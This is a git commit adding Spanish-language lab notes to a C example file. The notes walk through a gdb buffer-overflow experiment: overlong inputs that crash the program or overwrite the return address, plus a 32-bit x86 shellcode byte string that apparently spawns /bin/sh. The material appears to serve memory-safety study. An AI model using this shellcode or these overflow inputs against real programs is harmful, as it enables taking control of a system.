4ee643f3f64d9b8eaa999023444bae6295962674
Iván Chavero <ichavero@chavero.com.mx>
2025-10-14 13:17:57 -0600

    Agregué experimentos con gdb

--- examples/memory/checks/memory_checks.c
+++ examples/memory/checks/memory_checks.c
@@ -14,6 +14,20 @@
 *
 * Usage: make memory_checks && ./memory_checks 1234567
 *
+* make debug
+* list show program code
+* disas main show main function assembly code
+* run 123456781234567812345678 - segfaults
+* run 123456781234567811111111 - segfaults
+* run 1234567812345678111111111 - overwrites return address
+* run 1234567812345678111111118 - overwrites return address to 0x...38
+* (0x38 is ASCII for character '8') Return address (rip) is being rewritten
+* Check with info registers
+* shellcode:
+* unsigned char buf[] = 
+"\x31\xc9\xf7\xe1\xb0\x0b\x68\x2f\x73\x68\x00\x68\x2f\x62"
+"\x69\x6e\x89\xe3\xcd\x80"
+*
 */
 
 int main(int argc, char *argv[]) {
